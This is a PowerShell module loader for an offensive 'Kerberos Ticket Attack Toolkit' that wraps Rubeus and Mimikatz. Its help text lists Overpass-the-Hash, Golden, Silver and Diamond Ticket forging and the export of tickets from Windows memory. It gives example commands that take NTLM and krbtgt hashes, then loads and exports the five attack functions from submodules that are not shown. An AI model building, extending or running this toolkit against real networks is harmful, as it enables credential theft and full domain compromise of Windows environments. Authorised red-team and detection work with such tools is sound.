<#
.SYNOPSIS
    TicketToolkit — Kerberos Ticket Attack Toolkit (Rubeus & Mimikatz wrapper)

.DESCRIPTION
    Modular toolkit for executing Kerberos ticket-based attacks:
    Overpass-the-Hash, Golden Ticket, Silver Ticket, Diamond Ticket,
    and ticket export from Windows memory.

.EXAMPLE
    Import-Module .\TicketToolkit
    Invoke-OverpassTheHash -User admin -NTLMHash "31d6cfe0..."
    Invoke-GoldenTicket -User Administrator -KrbtgtHash "a9d6d7e8..." -DomainSID "S-1-5-21-..."
#>

# Dot-source sub-modules
. "$PSScriptRoot\OverpassTheHash\Invoke-OverpassTheHash.ps1"
. "$PSScriptRoot\GoldenTicket\Invoke-GoldenTicket.ps1"
. "$PSScriptRoot\SilverTicket\Invoke-SilverTicket.ps1"
. "$PSScriptRoot\DiamondTicket\Invoke-DiamondTicket.ps1"
. "$PSScriptRoot\Export\Export-AllTickets.ps1"

# Explicit exports
Export-ModuleMember -Function @(
    'Invoke-OverpassTheHash',
    'Invoke-GoldenTicket',
    'Invoke-SilverTicket',
    'Invoke-DiamondTicket',
    'Export-AllTickets'
)